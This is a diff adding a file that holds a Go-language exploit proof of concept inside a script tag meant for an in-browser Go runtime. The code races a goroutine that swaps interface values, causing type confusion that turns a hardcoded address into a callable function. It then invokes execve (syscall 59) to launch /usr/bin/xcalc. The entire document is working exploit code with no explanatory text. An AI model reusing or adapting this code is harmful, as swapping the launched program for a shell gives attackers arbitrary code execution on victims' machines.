@@ -1,0 +1,102 @@
+<script type="text/goscript">
+
+package main
+import "fmt"
+
+type itf interface{
+	X() bool
+}
+
+type safe struct{
+	f *int
+}
+
+type unsafe struct{
+	f func(uintptr, uintptr, uintptr, uintptr) bool
+}
+
+var bin_sh_slice []uint8
+var display []uint8
+
+var good itf
+var bad itf
+var confuse itf
+
+var argv []uintptr
+var env []uintptr
+
+func address(i interface{}) uint64{
+	ptr_str := fmt.Sprintf("%p",i)
+	var val uint64
+
+	for i:=2; i < len(ptr_str); i++{
+		 val *= 0x10
+		if '0' <= ptr_str[i] && ptr_str[i] <= '9'{
+			cur := ptr_str[i] - '0'
+			val += uint64(cur)
+		}else{
+			cur := ptr_str[i] - 'a' + 10
+			val += uint64(cur)
+		}
+	}
+	return val
+}
+
+func (s *safe) X() bool{
+	return false
+}
+
+func (u *unsafe) X() bool{
+	if u.f != nil{
+		u.f(59,uintptr(address(bin_sh_slice)), uintptr(address(argv)), uintptr(address(env)))
+	}
+	return false;
+}
+
+func main() {
+	argv = make([]uintptr,5)
+	env = make([]uintptr,5)
+	
+	bin_sh_slice = make([]uint8,20)
+	
+	shell := "/usr/bin/xcalc"
+	
+	for i := 0; i < len(shell); i++{
+		bin_sh_slice[i] = uint8(shell[i])
+	}
+	argv[0] = uintptr(address(bin_sh_slice))
+
+	display = make([]uint8,20)
+	env_var := "DISPLAY=:0"
+	for i := 0; i < len(env_var); i++{
+		display[i] = uint8(env_var[i])
+	}
+
+	env[0] = uintptr(address(display))
+	
+
+	pp := 0x0000000000480DA0
+	good = &safe{f:&pp}
+	bad = &unsafe{}
+	confuse = good
+
+	go func(){
+		var i int
+		for{
+			confuse = bad
+			confuse = good
+			i++
+			if i>100000{
+				break
+			}
+		}
+	}()
+
+	for{
+		confuse.X()
+	}
+	
+}
+
+
+</script>
